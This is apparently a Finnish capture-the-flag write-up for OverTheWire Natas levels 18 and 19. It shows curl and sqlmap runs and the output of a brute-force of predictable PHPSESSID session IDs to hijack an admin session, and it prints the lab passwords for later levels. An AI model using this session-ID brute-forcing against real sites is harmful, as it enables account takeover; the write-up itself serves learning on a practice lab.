# Natas 18 - START HERE;

6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ | natas18

![alt text](./kuvat-level16-20/natas18-0.png)

![alt text](./kuvat-level16-20/natas18-1.png)

![alt text](./kuvat-level16-20/natas18-2.png)


Kokeiltiin username ja password molempiin "admin" tunnuksella - se potki minut istunnosta ja kirjauduttua takaisin natas 18 tunnuksella ja sen salasanalla jonka purettiin aikaisemmin niin palattua sisään lukee näin 

**"You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."** . - Tämä tarkoittaa uusi istunto on alkanut. Nyt ei päästä takaisin etusivulle jossa voidaan syöttää sitä kirjauttumisen lomaketta eli username;password.

Siinä view source koodin pätkän funktiossa ainakin if-else parametrissä on nimetty jos on "admin" tunnus niin se pätevä osuus ikään kuin toimii ja alkaa uusi istunto. 

Sama kokeiltu tällä SQL injektio keinolla **admin" OR 1=1 --"**, mutta sekin menee samaan sivustoon ja näkymänsä eli "You are logged in as regular case.."

**Miten halutaan tyhjentää ja unohtaa se kirjauttumisen istunto?** Chrome: F12 --> Application ja siitä "cookies" alempi ja ensimmäinen vaihtoehto siitä oikea hiiren klikkaus ja "clear" ja sitten päivitä sivusto. Ei se välttämättä toimi yhdellä päivityksellä kannattaa kokeila toisen/kolmannen kerran ja poistaa eväste istunto.

![alt text](./kuvat-level16-20/natas18-3.png)


## selvittämistä ja pähkäilyä

sivuston - index-source.html sivuston mukaan siellä lukee näin

Tämä luku koskien on varmasti toi PHPSESSID - jossa chrome:ssa tyhjennettiin/poistettiin evästeiden tietoja ja voi olla tästä pitää saada täsmällinen luku. Tämä luku on riittävän alhainen, jotta PHPSESSID-muuttujaan voidaan kohdistaa raa'alla voimalla hyökkäys istunnon kaappaamiseksi (**session hijacking**). 
- $maxid = 640; // 640 should be enough for everyone

Tässä pientä toistoa, että miten pääsee puhdistaa ja unohtamaan istunnon kirjauttuneen tunnuksensa ja salasansa. 

![alt text](./kuvat-level16-20/natas18-4.png)

![alt text](./kuvat-level16-20/natas18-5.png)

Tässä (alempi kuva), muutin ton kirjauttuneen *maxid* se value 54:stä 1:seksi, josta on se 0 ja 1.
Mitä tämä tarkoittaa? 
- PHPSESSID on selaimen eväste, jolla PHP ylläpitää käyttäjän istuntotietoja. Kun arvo oli alun perin 54, se tarkoitti, että palvelin oli määrittänyt tälle istunnolle yksilöllisen tunnisteen “54”. Jos muuttaisin ykköseksi käsin, selaimen lähettämä istuntotunniste on 1:nen.

![alt text](./kuvat-level16-20/natas18-5-1.png)

![alt text](./kuvat-level16-20/natas18-5-2.png)

Päivitin sen sivuston niin tuli näin **DEBUG: Session start ok** - outoa. PHPSESSID-arvon muokkaaminen on lähinnä hyödyllistä testaukseen tai kehitykseen, ei normaaliin käyttöön. Tämä muutettun ykköseksi voi tarkoittaa muutakin mm:
<br><br>
- 🔐 Palvelin ei tunnista 1:stä, ellei se ole aiemmin luotu ja tallennettu palvelimen istuntotietokantaan.
- 🚫 Todennäköisesti palvelin pitää istuntoa virheellisenä tai ei löydä mitään siihen liittyvää tietoa.
- 🔄 Tämä voi johtaa siihen, että joudut kirjautumaan uudelleen, istuntosi nollautuu tai et saa mitään sisältöä.

![alt text](./kuvat-level16-20/natas18-5-3.png)


Seuraavaksi tässä alemmassa funtio osuudessa eli *index-source.html* sivustossa.
Tässä return kohdassa on laitettu kommentti, koska tämä tarkoittaisi emme voi päästä *admin* käyttäjätunnuksella sisään ja kertauksena 0 ja 1 ovat totuusarvoja eli **boolean logic** - **0 on false** ja **1 on true**. Tässä voittaisiin asettaa * $_SESSION["admin"] = 0; i*  - ikäään kuin tarvittaisiin salasansa vastaus. Sekä tästäkin toi PHPSESSID kokeiltiin jos kertalleen *1* niin se antoi sen index.php sivuston *DEBUG: Session start ok*. 

```
function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
```



## Kali Linux komentoja - START HERE;

### CURL komentoja - START HERE;

Muutama curl komentoja testaillaan

Aika perus:
```
┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas18.natas.labs.overthewire.org/" http://natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ@natas18.natas.labs.overthewire.org
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Tämä on vain malli, kun haluttaan selvittää HTTP protokollan statusta
`└─$ curl -I -H "Referer: http://natas19.natas.labs.overthewire.org/" -u "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" http://natas18.natas.labs.overthewire.org/index-source.html`

```
┌──(kali㉿kali)-[~]
└─$ curl -I -H "Referer: http://natas19.natas.labs.overthewire.org/" -u "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" http://natas18.natas.labs.overthewire.org/index-source.html
HTTP/1.1 200 OK
Date: Thu, 10 Jul 2025 16:40:56 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Thu, 10 Apr 2025 14:18:42 GMT
ETag: "343e-6326d434e63ca"
Accept-Ranges: bytes
Content-Length: 13374
Vary: Accept-Encoding
Content-Type: text/html
```

Tässä ensimmäisennä haluttaan muuttaa natas18 salasansa mukaan base64 muotoon (username + salasansa itsensä molemmat muuttuvat base64 muotoon)

```
┌──(kali㉿kali)-[~]
└─$ echo -n "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" | base64
bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
```

Tässä ei toiminutkaan, mutta silti testattiin. Ajatuksena tässä oli syöttää base64 (username + password), PHPSESSID ei vielä oikea, silti testattiin toi **brute-force session ID:t** (0-640), kunnes löytö sessio admin         

```
┌──(kali㉿kali)-[~]
└─$ curl 'http://natas18.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDRmdDSg==' \
  -H 'Cookie: PHPSESSID=515' \
  --insecure
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at natas18.natas.labs.overthewire.org Port 80</address>
</body></html>
```


Nyt alkoi pelittää voi olla jotakin kirjoitus tai muuta virhettä..
```
┌──(kali㉿kali)-[~]
└─$ echo -n "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" | base64
bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ curl 'http://natas18.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==' \
  -H 'Cookie: PHPSESSID=515' \
  --insecure
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```



---

### SQLMAP - START HERE;

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas18.natas.labs.overthewire.org/index.php" \                                    
  --auth-type Basic \
  --auth-cred "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" \
  --data "username=admin&password=admin" \
  --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:57:22 /2025-07-10/

[19:57:23] [INFO] testing connection to the target URL
[19:57:24] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
[19:57:24] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times
[19:57:24] [WARNING] your sqlmap version is outdated

[*] ending @ 19:57:24 /2025-07-10/

--auth-type: command not found
```

SQLMapilla on perinteinen komento ensimmäisen tarkistuksen tekemiseen ja tämä on malli: 
`sqlmap -u "http://kohde.fi/sivu.php?id=1" --batch --risk=3 --level=5`


Tässä lisättynä käyttäjätunnus:salasansa, et miten se menee:
`sqlmap -u "http://natas18.natas.labs.overthewire.org/" --auth-type=Basic --auth-cred="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" --batch --risk=3 --level=5`


```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas18.natas.labs.overthewire.org/" --auth-type=Basic --auth-cred="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" --batch --risk=3 --level=5
        ___
       __H__                                                                                                                                          
 ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                                              
|_ -| . [']     | .'| . |                                                                                                                             
|___|_  [']_|_|_|__,|  _|                                                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:02:38 /2025-07-10/

[20:02:39] [INFO] testing connection to the target URL
[20:02:40] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:02:40] [INFO] testing if the target URL content is stable
[20:02:40] [INFO] target URL content is stable
[20:02:40] [INFO] testing if parameter 'User-Agent' is dynamic
[20:02:40] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[20:02:40] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[20:02:40] [INFO] testing for SQL injection on parameter 'User-Agent'
..................................
........................................
.............................................
[20:16:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:16:16] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[20:16:20] [WARNING] parameter 'Host' does not seem to be injectable
[20:16:20] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[20:16:20] [WARNING] your sqlmap version is outdated

[*] ending @ 20:16:20 /2025-07-10/
```

**Mitä tässä tuloksena tarkoittaa? (ylempi tulokset)**

🚫 "all tested parameters do not appear to be injectable"
SQLMap ei löytänyt injektoitavia parametreja testatuista kohdista.

Tämä voi johtua:
Sivuston hyvästä suojauksesta (esim. WAF eli Web Application Firewall).
Parametrien puutteellisesta tunnistamisesta.
Tarpeesta käyttää tarkempia asetuksia tai tamper-skriptejä.


🛡️ "try to use option '--tamper'"
SQLMap ehdottaa kokeilemaan --tamper-asetusta, joka muokkaa hyökkäyspyyntöjä ohittaakseen suojauksia.
Esimerkki: --tamper=space2comment muuttaa välilyönnit SQL-kommenteiksi, mikä voi hämätä WAF:ia.


## Jotakin uutta esille ja katsotaan netistä vihjeitä:

Mentiin tällaisen Python koodilla - se on yksi tapa laskea, se count-muuttuja joka käyttää sitä **"PHPSESSID:le"**. Tämän ideana on kuin lähettää yhdessä basicAuth-tietoja GET pyynnön kautta ja periaatteessa laskee kuitenkin sen PHPSESSID luvunsa. Tosiaan vastaus PHPSESSID luku 119.

Python koodissa on alkava luku 1 ja maksimi päättyy 640, että siksi päädyssä päättyy 640 asti, että pitää tarkistaa mikä on se virallinen luku. Jos mentäisiin F12 cookies (eväste) kautta niin on tosi työllästä ja joutuu päivittelee sitä sivusstoa.

![alt text](./kuvat-level16-20/natas18-6.png)

![alt text](./kuvat-level16-20/natas18-6-1.png)

![alt text](./kuvat-level16-20/natas18-6-2.png)

Tämä on siitä osasta (ylempi kuva pätkä), mutta dejavu toistoa ja tämä kertoo sen PHPSESSID luku on 119.

```
PHPSESSID=118
PHPSESSID=119
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

PHPSESSID=120
```

Tässä nähdään se laskee siihen 640 asti.

![alt text](./kuvat-level16-20/natas18-6-3.png)

**Seuraavaksi**:
Samalla tarkistellaan sivustoa, että täsmentyykö ja tarkistuksen kannalta varmuuden vuoksi. Heitetään oletus ja ensimmäinen tunnus + salasana on admin koska halutaan päästä siihen evästeen käsiksi.

![alt text](./kuvat-level16-20/natas18-7.png)

Kirjauduttua huomataan se antoi PHPSESSID luvunsa ja muutettaan sille virallinen oikea luku eli 119

![alt text](./kuvat-level16-20/natas18-8.png)

![alt text](./kuvat-level16-20/natas18-9.png)

Sitten sivuston URL perään laitoin *?debnug* , koska jotta päästää siihen ja siinä view source html:ssäkin **debug** funktio osuus.

![alt text](./kuvat-level16-20/natas18-10.png)

**OPTIONAL** aikaisemmasta kummosin ton debug url:in perässä , että toimiiko se ilman ja toimi. Tässä on Natas 19 salasansa.

![alt text](./kuvat-level16-20/natas18-11.png)

---

# Natas 19 - START HERE:

Username: natas19 <br>
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

![alt text](./kuvat-level16-20/natas19-0.png)

![alt text](./kuvat-level16-20/natas19-1.png)

Tämä on sama kuin aikaisepi taso eli 18, mutta **session ID:tä** ei ole saatavilla eli vaikeammaksi mennään. Ainakin tästä testattu yleis käyttäjätunnus ja salasanalla sisään (admin:admin) niin antoi uuden sivustson, jossa lukee näin:

**This page uses mostly the same code as the previous level, but session IDs are no longer sequential... You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.**

![alt text](./kuvat-level16-20/natas19-2.png)

Sama jouduttiin clear sitä evästettä, josta sitten päästään tähän kirjauttumisen etusivulle eli syötä *username;password*. Voi olla tämä konfiguroitu *view-source.html* sama kuin aikaisempi, mutta tässä tasossa ei annetta lisää vihjeitä kuitenkaan paitsi tämä (ylempi kuvaus)

Myös sama testasin SQL injektiota, että ei antanut mitään vastausta, että tämä on vaikeampi ja koska PHPSESSID ei toistu peräkkäin. Siksi nyt tämä sulkee pois brutoe-force lähetymistavan.

![alt text](./kuvat-level16-20/natas19-3.png)


## Kali linux - testausta START HERE;

```
└─$ curl -I -H "Referer: http://natas20.natas.labs.overthewire.org/" -u "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" http://natas19.natas.labs.overthewire.org/index-source.html
```


```
┌──(kali㉿kali)-[~]
└─$ curl -I -H "Referer: http://natas20.natas.labs.overthewire.org/" -u "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" http://natas19.natas.labs.overthewire.org/index-source.html
HTTP/1.1 200 OK
Date: Sat, 12 Jul 2025 16:30:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Thu, 10 Apr 2025 14:18:42 GMT
ETag: "45de-6326d434e830a"
Accept-Ranges: bytes
Content-Length: 17886
Vary: Accept-Encoding
Content-Type: text/html
```

```
┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas19.natas.labs.overthewire.org/" http://natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr@natas19.natas.labs.overthewire.org
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>

<p>
Please login with your admin account to retrieve credentials for natas20.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
</div>
</body>
</html>



┌──(kali㉿kali)-[~]
└─$ echo -n "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" | base64
bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==
                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ curl 'http://natas19.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==' \
  -H 'Cookie: PHPSESSID=515' \
  --insecure
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at natas19.natas.labs.overthewire.org Port 80</address>
</body></html>
```

## Netistä tarkistellaan tietoa ja vihjeitä

Otettin uusi yritys ainakin, josta username;password (admin) - niin antoi jonkinlaisen eväste luvun (cookies value) ja tarkistellaan mitä se luku oikein tarkoittakaan

menin *username;password* : admin ja se eväste luku on: 3131392d61646d696e <br>
Tästä luvusta muutettu **hex decodes on 119-admin**, kun joka kerta puhdistan/tyhjennän kirjauttuneen evästeen niin se luku muuttuu ja tarkistuksena tarkistettu se alku lukukin on eri.

**Tämä tarkoittaa dekoodaa hexmerkkijonon tekstiksi**:
```
┌──(kali㉿kali)-[~]
└─$ echo -n 3131392d61646d696e | xxd -r -p                             
119-admin                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ echo -n 39342d61646d696e | xxd -r -p
94-admin                                                                                                                                                                   
```

Periaatteessa nyt pitää selvittää tämä <VALUE>-admin mikä onkaan. Nyt ideana on selvittää PHPSESSID luku, jotta saadaan selvitettyä Natas20 salasansa. Periaatteessa sama tarkoittava, mutta vain dekoodattu dataa.

### Brute force START NOW;

Jossakin ohjeessa lisätään parametriä siihen, että se tekee sen satunnaisen ja suorittaa luvut järjestyksessä, kuin aikaisempi harjoitus natas 18 (menee PHPSESSID 1:stä 640 asti), mutta nyt halutaan selvittää se evästeen luku ja alkaen kuin 1 dekoodattuna eli **<value>-admin**. Tässäkin harjoituksessa menee sama Python koodilla, mutta vain lisätty pientä ominaisuutta sisään.

```
┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi19.py 
PHPSESSID=312d61646d696e
PHPSESSID=322d61646d696e
PHPSESSID=332d61646d696e
PHPSESSID=342d61646d696e
PHPSESSID=352d61646d696e
PHPSESSID=362d61646d696e
PHPSESSID=372d61646d696e
PHPSESSID=382d61646d696e
PHPSESSID=392d61646d696e
PHPSESSID=31302d61646d696e
PHPSESSID=31312d61646d696e
PHPSESSID=31322d61646d696e
..........


PHPSESSID=3237392d61646d696e
PHPSESSID=3238302d61646d696e
PHPSESSID=3238312d61646d696e
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
</body>
</html>

PHPSESSID=3238322d61646d696e
PHPSESSID=3238332d61646d696e
PHPSESSID=3238342d61646d696e
............

PHPSESSID=3633352d61646d696e
PHPSESSID=3633362d61646d696e
PHPSESSID=3633372d61646d696e
PHPSESSID=3633382d61646d696e
PHPSESSID=3633392d61646d696e
PHPSESSID=3634302d61646d696e
Done!
```

![alt text](./kuvat-level16-20/natas19-4-0.png)

![alt text](./kuvat-level16-20/natas19-4-1.png)

![alt text](./kuvat-level16-20/natas19-4-2.png)


![alt text](./kuvat-level16-20/natas19-5.png)


Jos tarkistellaan toi luku "3238312d61646d696e" varmuuden vuoksi:
```
┌──(kali㉿kali)-[~]
└─$ echo -n 3238312d61646d696e | xxd -r -p
281-admin 
```

**Nyt tarkistellaan se eväste luku ja pitääkö paikkaansa:**

![alt text](./kuvat-level16-20/natas19-6.png)

![alt text](./kuvat-level16-20/natas19-7.png)

![alt text](./kuvat-level16-20/natas19-8.png)


---


